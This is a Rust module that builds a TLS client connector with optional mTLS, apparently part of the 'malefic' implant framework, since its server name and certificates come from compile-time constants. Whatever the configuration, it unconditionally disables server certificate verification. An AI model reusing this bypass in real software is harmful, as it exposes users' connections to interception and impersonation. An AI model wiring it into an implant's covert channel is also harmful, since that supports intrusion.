use std::sync::Arc;
use anyhow::Result;
use async_tls::TlsConnector;
use rustls::{
    client::{ServerCertVerified, ServerCertVerifier, ServerName},
    version::{TLS12, TLS13},
    Certificate, ClientConfig, RootCertStore, PrivateKey,
    cipher_suite,
};
use malefic_helper::debug;


#[derive(Debug, Clone)]
pub struct TlsConfig {
    /// TLS protocol versions
    pub versions: Vec<&'static rustls::SupportedProtocolVersion>,
    /// Server domain name
    pub server_name: String,
    /// Custom cipher suites
    pub cipher_suites: Option<Vec<rustls::SupportedCipherSuite>>,
    /// Skip certificate verification (for self-signed certificates)
    pub skip_verification: bool,

    /// mtls Optional
    /// Client certificate data (mTLS)
    pub client_cert_data: Option<(Vec<u8>, Vec<u8>)>, // (cert_chain, private_key)
    /// Custom CA certificate for server verification (optional)
    pub custom_ca: Option<Vec<u8>>,
}

impl Default for TlsConfig {
    fn default() -> Self {
        Self {
            versions: vec![&TLS13, &TLS12], // Default supports both versions, prefer 1.3
            client_cert_data: None,
            server_name: String::new(),
            cipher_suites: None,
            custom_ca: None,
            skip_verification: true, // Default skip certificate verification to avoid various certificate format issues
        }
    }
}

impl TlsConfig {
    /// Create new TLS configuration
    pub fn new() -> Self {
        Self::default()
    }

    /// Set TLS protocol versions
    pub fn with_versions(mut self, versions: Vec<&'static rustls::SupportedProtocolVersion>) -> Self {
        self.versions = versions;
        self
    }

    /// Set to TLS 1.2 only
    pub fn tls12_only(mut self) -> Self {
        self.versions = vec![&TLS12];
        self
    }

    /// Set to TLS 1.3 only
    pub fn tls13_only(mut self) -> Self {
        self.versions = vec![&TLS13];
        self
    }

    /// Set custom CA certificate for server verification
    pub fn with_custom_ca(mut self, ca_cert: Vec<u8>) -> Self {
        self.custom_ca = Some(ca_cert);
        self
    }

    /// Set client certificate data (enable mTLS)
    pub fn with_client_cert_data(mut self, cert_chain: Vec<u8>, private_key: Vec<u8>) -> Self {
        self.client_cert_data = Some((cert_chain, private_key));
        self
    }

    /// Set server domain name
    pub fn with_server_name<S: Into<String>>(mut self, name: S) -> Self {
        self.server_name = name.into();
        self
    }

    /// Set custom cipher suites
    pub fn with_cipher_suites(mut self, suites: Vec<rustls::SupportedCipherSuite>) -> Self {
        self.cipher_suites = Some(suites);
        self
    }



    /// Create configuration for self-signed certificates (skips verification)
    pub fn self_signed(self) -> Self {
        Self {
            versions: vec![&TLS12, &TLS13], // Self-signed supports both versions
            client_cert_data: None,
            server_name: String::new(),
            cipher_suites: Some(vec![
                cipher_suite::TLS13_AES_128_GCM_SHA256,
                cipher_suite::TLS13_AES_256_GCM_SHA384,
                cipher_suite::TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
                cipher_suite::TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
            ]),
            custom_ca: None,
            skip_verification: true, // Skip verification for self-signed certificates
        }
    }

    /// Create standard TLS configuration
    pub fn standard() -> Self {
        Self::default()
    }


}

/// TLS connector builder
pub struct TlsConnectorBuilder {
    config: TlsConfig,
}

impl TlsConnectorBuilder {
    pub fn new(config: TlsConfig) -> Self {
        Self { config }
    }

    /// Build TLS connector
    pub fn build(self) -> Result<TlsConnector> {
        debug!("[tls] Building TLS connector with config: {:?}", self.config);

        // Create root certificate store - always use system CA, optionally add custom CA
        let mut root_store = RootCertStore::empty();
        root_store.add_server_trust_anchors(
            webpki_roots::TLS_SERVER_ROOTS.0.iter().map(|ta| {
                rustls::OwnedTrustAnchor::from_subject_spki_name_constraints(
                    ta.subject,
                    ta.spki,
                    ta.name_constraints,
                )
            })
        );
        
        // Add custom CA if provided
        if let Some(ca_cert_data) = &self.config.custom_ca {
            let ca_cert = Certificate(ca_cert_data.clone());

            if let Err(e) = root_store.add(&ca_cert) {
                debug!("[tls] Failed to add custom CA: {:?}, but continuing", e);
                // Continue even if adding CA fails, since we will skip verification
            } else {
                debug!("[tls] Custom CA added successfully");
            }
        }

        // Use TLS versions from configuration
        let versions = self.config.versions.clone();

        // Select cipher suites
        let cipher_suites = match &self.config.cipher_suites {
            Some(suites) => suites.clone(),
            None => {
                // Intelligently select cipher suites based on supported versions
                let mut suites = Vec::new();
                if versions.contains(&&TLS13) {
                    suites.extend(vec![
                        cipher_suite::TLS13_AES_128_GCM_SHA256,
                        cipher_suite::TLS13_AES_256_GCM_SHA384,
                        cipher_suite::TLS13_CHACHA20_POLY1305_SHA256,
                    ]);
                }
                if versions.contains(&&TLS12) {
                    suites.extend(vec![
                        cipher_suite::TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
                        cipher_suite::TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
                        cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
                        cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
                    ]);
                }
                suites
            },
        };

        // Build configuration
        let client_build = ClientConfig::builder()
            .with_cipher_suites(&cipher_suites)
            .with_safe_default_kx_groups()
            .with_protocol_versions(&versions)?
            .with_root_certificates(root_store);

        // Handle client certificate authentication
        let client_config = match &self.config.client_cert_data {
            Some((cert_chain_data, private_key_data)) => {
                debug!("[tls] Setting up client certificate for mTLS");
                
                // Parse client certificate chain
                let cert_chain = rustls_pemfile::certs(&mut cert_chain_data.as_slice())?
                    .into_iter()
                    .map(Certificate)
                    .collect();

                // Parse private key
                let mut key_reader = private_key_data.as_slice();
                let private_key = if let Some(key) = rustls_pemfile::rsa_private_keys(&mut key_reader)?.into_iter().next() {
                    PrivateKey(key)
                } else if let Some(key) = rustls_pemfile::pkcs8_private_keys(&mut key_reader)?.into_iter().next() {
                    PrivateKey(key)
                } else {
                    return Err(anyhow::anyhow!("No valid private key found"));
                };

                client_build.with_single_cert(cert_chain, private_key)?
            }
            None => {
                client_build.with_no_client_auth()
            }
        };

        // Simplified: directly skip all certificate verification to avoid various certificate format issues
        let mut final_config = client_config;
        final_config
            .dangerous()
            .set_certificate_verifier(Arc::new(NoCertificateVerification));

        Ok(TlsConnector::from(Arc::new(final_config)))
    }
}

/// Certificate verifier that skips all verification - accepts any certificate
struct NoCertificateVerification;

impl ServerCertVerifier for NoCertificateVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &Certificate,
        _intermediates: &[Certificate],
        _server_name: &ServerName,
        _scts: &mut dyn Iterator<Item = &[u8]>,
        _ocsp_response: &[u8],
        _now: std::time::SystemTime,
    ) -> Result<ServerCertVerified, rustls::Error> {
        Ok(ServerCertVerified::assertion())
    }
}

/// Build TLS configuration from compile-time constants
/// 
/// This function reads TLS configuration from the config module and creates
/// a properly configured TlsConfig instance.
pub fn build_tls_config() -> TlsConfig {
    use crate::config::{TLS_VERSION, TLS_SNI};
    
    #[cfg(feature = "mtls")]
    use crate::config::{TLS_MTLS_CLIENT_CERT, TLS_MTLS_CLIENT_KEY, TLS_MTLS_SERVER_CA};

    // Parse TLS version from configuration
    let mut config = match TLS_VERSION.as_str() {
        "1.2" => TlsConfig::new().tls12_only(),
        "1.3" => TlsConfig::new().tls13_only(),
        "auto" => TlsConfig::new(), // Default supports Auto (TLS 1.3 + 1.2)
        _ => TlsConfig::new(), // Default to auto
    };
    
    // Set server name and skip verification
    config = config.with_server_name(TLS_SNI.clone());

    // 默认跳过证书验证以避免各种证书格式问题
    config.skip_verification = true;
    
    // config.skip_verification = *SKIP_VERIFICATION;
    // Add client certificate if mTLS feature is enabled and data is available
    #[cfg(feature = "mtls")]
    {
        if !TLS_MTLS_CLIENT_CERT.is_empty() && !TLS_MTLS_CLIENT_KEY.is_empty() {
            // Use certificate data directly
            config = config.with_client_cert_data(
                TLS_MTLS_CLIENT_CERT.clone(),
                TLS_MTLS_CLIENT_KEY.clone()
            );
        }
        
        // If custom server CA is provided, add it to the configuration
        if !TLS_MTLS_SERVER_CA.is_empty() {
            config = config.with_custom_ca(TLS_MTLS_SERVER_CA.clone());
        }
    }

    config
}


